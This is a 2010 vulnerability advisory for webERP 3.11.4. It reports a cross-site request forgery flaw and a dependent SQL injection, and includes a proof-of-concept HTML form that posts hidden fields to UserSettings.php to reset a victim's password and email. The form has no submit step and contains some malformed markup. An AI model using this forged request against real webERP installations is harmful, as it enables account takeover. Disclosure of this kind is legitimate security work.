@@ -1,0 +1,41 @@
+# Title: webERP Multiple Vulnerabilities
+# Author: ADEO Security
+# Published: 30/06/2010
+# Version: 3.11.4 (Possible all versions)
+# Vendor: http://www.weberp.org
+
+# Description: "webERP is a complete web based accounting/ERP system
+that requires only a web-browser and pdf reader to use. It has a wide
+range of features suitable for many businesses particularly
+distributed businesses in wholesale and distribution. It is developed
+as an open-source application and is available as a free download to
+use. The feature set is continually expanding as new businesses and
+developers adopt it.There are on average 5,000 downloads per month."
+
+# Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs
+- Mail: security[AT]adeo.com.tr
+- Web: http://security.adeo.com.tr
+
+# Vulnerabilities:
+1) CSRF: Attacker can add new administrator to the system. All files
+have this issue. See #PoC section.
+2) SQL Injection: Application offer disable the magic_quotes_gpc.
+Attacker can inject sql codes if exploit the CSRF vulnerability. HTTP
+Requests must filtered.
+
+# PoC (CSRF):
+<html>
+<body>
+<form method="POST" action="http://server/UserSettings.php?">
+<input type="hidden" name="RealName" VALUE="ADEO-Security">
+<input type='hidden' name='DisplayRecordsMax' VALUE="10">
+<input type='hidden' name='Language' VALUE='en_US'>
+<input type='hidden' name='Theme' VALUE='green'>
+<input type='hidden' name='pass' value='adeopass'>
+<input type='hidden' name='passcheck' value='adeopass'>
+<input type='hidden' name='email' size=40 value='hacked@weberp.org'>
+<input type='hidden' name='Modify' value="Modify""></div>
+</form>
+
+</body>
+</html>
